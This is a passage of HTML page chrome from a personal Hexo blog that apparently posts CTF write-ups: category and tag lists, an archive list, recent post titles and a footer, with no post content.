      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
          </li>
        
          <li>
            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 i0gan<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>